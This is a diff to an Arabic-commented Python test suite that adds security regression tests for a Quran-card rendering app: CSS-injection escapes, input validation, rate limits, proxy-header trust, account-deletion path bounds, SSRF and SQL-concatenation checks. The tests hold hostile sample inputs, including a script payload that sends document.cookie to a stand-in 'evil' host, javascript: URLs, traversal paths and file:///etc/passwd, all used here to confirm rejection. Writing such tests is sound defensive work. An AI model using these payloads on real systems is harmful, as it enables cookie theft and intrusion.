@@ -562,7 +562,7 @@ for _step in ("ruff check", "mypy", "security_scan.py", "api_contract.py --check
     check(f"خطّ التكامل يشمل: {_step}", _step in _ci)
 
 # الخطوات التي أُضيفت في التصليب — تُشترط في CI صراحةً
-for _step in ("pip-audit", "leak_test.py", "dbsafe.py restore-test",
+for _step in ("pip-audit", "leak_test.py", "isolation_test.py", "dbsafe.py restore-test",
               "dbsafe.py migrate-check", "docker run", "healthz", "readyz"):
     check(f"وخطّ التكامل يشمل: {_step}", _step in _ci)
 check("ودخانُ الصورة يتحقّق من الملفّات الثابتة فيها",
@@ -576,10 +576,23 @@ check("والبوّابة تُصنّف المحجوب BLOCKED لا PASS",
 check("وتطبع سببَ السقوط وأمرَه وملفَّه واقتراحَ إصلاحه",
       all(x in _g for x in ("reason", "command", "file", "fix")))
 
+
+# وثيقةُ حالة الإطلاق: تُقرأ آليًّا فلا تتقادم صامتة
+_st = open(os.path.join(_root, "P0_RELEASE_STATUS.md"), encoding="utf-8").read()
+check("وثيقةُ حالة الإطلاق موجودة", bool(_st))
+for _sec in ("PROVEN", "BLOCKED", "READY BUT NOT APPLIED", "DEFERRED"):
+    check(f"وفيها قسم {_sec}", _sec in _st)
+check("ولا تكتب PASS لما لم يُشغَّل",
+      "Docker Build" in _st and "BLOCKED" in _st
+      and "لم تُبنَ قطّ" in _st)
+check("وتقول إن الهجرة ٠٠٣ جاهزةٌ غيرُ مطبَّقة",
+      "003_jobs_state_guard" in _st and "غيرُ مطبَّقةٍ على قاعدة الإنتاج" in _st)
+check("وتذكر المسار الوحيد المسموح", "make db-safe-migrate" in _st)
+
 check("والأوامر نفسها متاحةٌ محلّيًّا بـmake gate",
       all(x in open(os.path.join(_root, "Makefile")).read()
           for x in ("ruff check", "mypy", "security_scan.py", "tests.py",
-                    "audit.py", "ui_audit.py", "failure_test.py")))
+                    "audit.py", "ui_audit.py", "failure_test.py", "isolation_test.py")))
 
 print("\n▸ الوكيل")
 from falah import agent as AG
@@ -1326,6 +1339,153 @@ check("والمصدر نفسه يقارن الطول قبل الأرقام",
 
 
 
+
+
+print("\n▸ مراجعة الإنتاج الساكنة — انحدارات")
+
+# ١ · حقنُ CSS عبر لون الحبر (كان يخرج من <style> إلى <script>)
+_cq2, _ = RD.fetch_card("quran", surah=108, ayah=1)
+for _bad, _why in (
+    ("red</style><script>fetch('http://evil/'+document.cookie)</script><style>", "خروجٌ إلى script"),
+    ("red}body{background:url('http://evil/x')}.z{color:blue", "قاعدةُ CSS جديدة"),
+    ("expression(alert(1))", "تعبيرٌ تنفيذيّ"),
+    ("url(javascript:alert(1))", "رابطٌ تنفيذيّ"),
+    ("#fff;}*{display:none", "إغلاقُ قاعدة"),
+    ("</style>", "إغلاقُ الوسم وحده")):
+    _h = RD.build_html(_cq2, "quran", ink=_bad)
+    check(f"لون الحبر لا يُدخل CSS: {_why}",
+          not any(x in _h for x in ("<script>", "evil", "expression(", "javascript:",
+                                    "*{display:none")) and _h.count("</style>") == 1,
+          _bad[:40])
+check("واللون الصحيح ما زال يُطبَّق", "#F0E5CA" in RD.build_html(_cq2, "quran", ink="#F0E5CA"))
+check("والاسم المعروف كذلك", "color:gold" in RD.build_html(_cq2, "quran", ink="gold"))
+check("والقيمة المجهولة تسقط إلى لون الهيئة",
+      "color:#2B2116" in RD.build_html(_cq2, "quran", ink="لونٌ لا وجود له"))
+check("safe_color دالّةٌ مستقلّة تُختبر وحدها",
+      RD.safe_color("#abc", "X") == "#abc" and RD.safe_color("x}y{", "X") == "X"
+      and RD.safe_color(None, "X") == "X" and RD.safe_color("auto", "X") == "X")
+check("والعلامة المائية ما زالت مهروبة",
+      "&lt;script&gt;" in RD.build_html(_cq2, "quran", watermark="<script>alert(1)</script>"))
+
+# ٢ · القيم المعدودة تُرفض في طبقة المشاريع لا في الواجهة
+for _f, _v in (("skin", "'; DROP--"), ("ratio", "../../etc"), ("kind", "<script>")):
+    check(f"projects.validate يرفض {_f}",
+          _try_err(lambda f=_f, v=_v: PJ.validate({f: v}), PJ.ProjectError))
+check("ويرفض ما تجاوز الطول",
+      _try_err(lambda: PJ.validate({"watermark": "و" * 100}), PJ.ProjectError))
+check("ويقبل الصحيح",
+      PJ.validate({"skin": "night", "ratio": "square", "kind": "series"}) is not None)
+check("والحدود مكتوبةٌ في مكانٍ واحد",
+      set(PJ.ENUMS) == {"kind", "skin", "ratio"} and set(PJ.LIMITS) >= {"title", "watermark"})
+check("وقيم ENUMS تطابق ما يعرفه المحرّك فعلًا",
+      PJ.ENUMS["ratio"] == set(RD.SIZES) and PJ.ENUMS["skin"] <= set(RD.SKINS))
+
+# ٣ · حدُّ حجم الجسم
+check("حدُّ الجسم من البيئة", "FALAH_MAX_BODY" in _appsrc)
+check("والجسمُ فوق الحدّ يرفع استثناءً لا يُرمى صامتًا",
+      "class BodyTooLarge" in _appsrc and "raise BodyTooLarge" in _appsrc)
+check("ويُردّ ٤١٣ مع إغلاق الاتصال",
+      "413" in _appsrc and "close_connection = True" in _appsrc)
+
+# ٤ · حدُّ المعدّل على المكلف
+check("حدُّ المعدّل يشمل التصدير والمقطع والوكيل والتسجيل والتنزيل",
+      set(APP.RATE) == {"export", "video", "agent", "register", "file"}, str(set(APP.RATE)))
+# يُختبر أثرًا لا نصًّا: الاسم يُبنى في الشيفرة فلا يظهر حرفيًّا فيها
+_oldrate = os.environ.get("FALAH_RATE_EXPORT")
+os.environ["FALAH_RATE_EXPORT"] = "7"
+importlib.reload(APP)
+check("حدُّ المعدّل يُقرأ من البيئة فعلًا", APP.RATE["export"][0] == 7,
+      str(APP.RATE["export"]))
+if _oldrate is None: os.environ.pop("FALAH_RATE_EXPORT", None)
+else: os.environ["FALAH_RATE_EXPORT"] = _oldrate
+importlib.reload(APP)
+check("وافتراضيُّه معقولٌ حين لا تُضبط", APP.RATE["export"][0] >= 10,
+      str(APP.RATE["export"]))
+check("والعدُّ عند القبول لا عند الطلب — فلا يُعاقَب تزامنٌ مشروع",
+      _appsrc.count("rate_bump") >= 5 and
+      _appsrc.index('self.rate_bump(c, "export"') > _appsrc.index("JB.enqueue(c, u[\"id\"], \"export\""))
+check("ويُردّ ٤٢٩ مع Retry-After لا ٤٠٠",
+      "429" in _appsrc and "Retry-After" in _appsrc)
+
+
+# عنوانُ العميل خلف وكيل — الأخيرة لا الأولى
+class _FakeH:
+    def __init__(self, xff=None, addr="10.0.0.9"):
+        import email.message
+        self.headers = email.message.Message()
+        if xff is not None: self.headers["X-Forwarded-For"] = xff
+        self.client_address = (addr, 1234)
+_ip = APP.App.client_ip
+_o3 = os.environ.get("FALAH_TRUST_PROXY")
+os.environ["FALAH_TRUST_PROXY"] = "1"; importlib.reload(APP)
+check("خلف وكيلٍ موثوق: يُؤخذ ما كتبه الوكيلُ آخِرًا لا ما انتحله العميل",
+      APP.App.client_ip(_FakeH("1.2.3.4, 203.0.113.7")) == "203.0.113.7")
+check("وبلا ترويسةٍ يُؤخذ عنوان الاتصال",
+      APP.App.client_ip(_FakeH(None)) == "10.0.0.9")
+os.environ.pop("FALAH_TRUST_PROXY", None); importlib.reload(APP)
+check("وبلا إعلانِ ثقةٍ لا تُقرأ الترويسة أصلًا — فلا تُنتحَل",
+      APP.App.client_ip(_FakeH("1.2.3.4")) == "10.0.0.9")
+if _o3 is not None: os.environ["FALAH_TRUST_PROXY"] = _o3
+importlib.reload(APP)
+_cad = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                         "deploy", "Caddyfile"), encoding="utf-8").read()
+check("والوكيلُ في النشر يمحو ما جاء من العميل",
+      "header_up X-Forwarded-For {remote_host}" in _cad)
+
+# ٥ · حدُّ حذف الحساب صار مجلّد صاحبه لا جذر المشروع
+_asrc2 = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                           "falah", "auth.py"), encoding="utf-8").read()
+check("حذفُ الحساب محدودٌ بمجلّد صاحبه",
+      'os.path.join(export_dir, "exports", str(user_id))' in _asrc2)
+check("ويحلّ الوصلات الرمزية (realpath لا abspath)",
+      "os.path.realpath" in _asrc2 and "os.path.commonpath" not in _asrc2)
+# إثباتٌ عمليّ: سطرٌ منحرفٌ في exports لا يحذف ملفًّا خارج المجلّد
+_dd = tempfile.mkdtemp()
+os.makedirs(os.path.join(_dd, "exports", "999"), exist_ok=True)
+_victim = os.path.join(_dd, "app.py"); open(_victim, "w").write("# ملفٌّ حسّاس")
+_mine = os.path.join(_dd, "exports", "999", "a.png"); open(_mine, "w").write("x")
+_dc = ST.init(os.path.join(_dd, "t.db"))
+_du = AU.register(_dc, _m("del"), _pw, "حذف", "ق")
+_dc.execute("""INSERT INTO exports(user_id,fmt,path,created_at) VALUES(?,?,?,?)""",
+            (_du, "png", "app.py", ST.now()))
+_dc.execute("""INSERT INTO exports(user_id,fmt,path,created_at) VALUES(?,?,?,?)""",
+            (_du, "png", "../app.py", ST.now()))
+_dc.execute("""INSERT INTO exports(user_id,fmt,path,created_at) VALUES(?,?,?,?)""",
+            (_du, "png", f"exports/{_du}/a.png", ST.now()))
+_dc.commit()
+os.makedirs(os.path.join(_dd, "exports", str(_du)), exist_ok=True)
+_ownfile = os.path.join(_dd, "exports", str(_du), "a.png"); open(_ownfile, "w").write("x")
+_gone = AU.delete_account(_dc, _du, export_dir=_dd)
+check("سطرٌ منحرفٌ لا يحذف ملفًّا خارج مجلّد صاحبه", os.path.exists(_victim))
+check("وملفُّ مستخدمٍ آخر يبقى", os.path.exists(_mine))
+check("وملفُّ صاحبه يُحذف فعلًا",
+      not os.path.exists(_ownfile) and _gone["files"] == 1, str(_gone))
+_dc.close()
+
+# ٦ · SSRF في جلب التلاوة
+import video as _VD2
+for _u in ("file:///etc/passwd", "ftp://x/y", "gopher://x/1", "/etc/passwd", "data:x"):
+    check(f"جلبُ التلاوة يرفض المخطَّط: {_u[:24]}",
+          _try_err(lambda u=_u: _VD2.fetch(u, "/dev/null"), SystemExit))
+check("وحجمُ التلاوة محدودٌ من البيئة", "FALAH_MAX_AUDIO_BYTES" in
+      open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "video.py")).read())
+
+# ٧ · لا بناءَ SQL بالدمج في مسارات القراءة
+_apisrc2 = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "api.py")).read()
+check("لا استعلامَ مركَّبٌ بـ% في api.py",
+      not _re2.search(r'execute\(\s*"[^"]*"\s*%', _apisrc2))
+check("ولا استعلامَ f-string يحمل قيمة",
+      not _re2.search(r'execute\(f"[^"]*\{(?!\s*\})', _apisrc2))
+
+# ٨ · لا shell ولا eval في مسار الإنتاج
+for _mod in ("app.py", "api.py", "video.py", "render.py", "carousel.py", "worker.py"):
+    _t = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), _mod)).read()
+    check(f"{_mod}: لا shell=True ولا eval ولا os.system",
+          "shell=True" not in _t and "os.system" not in _t
+          and not _re2.search(r"\beval\(|\bexec\(", _t))
+check("وكلُّ نداءات ffmpeg بقائمةِ وسائط لا بسطر أوامر",
+      _re2.findall(r"subprocess\.run\(\[", open(os.path.join(
+          os.path.dirname(os.path.abspath(__file__)), "video.py")).read()).__len__() >= 4)
 
 print("\n▸ تحقّق الإعداد عند الإقلاع")
 def _cfg(expect_fail, **kw):
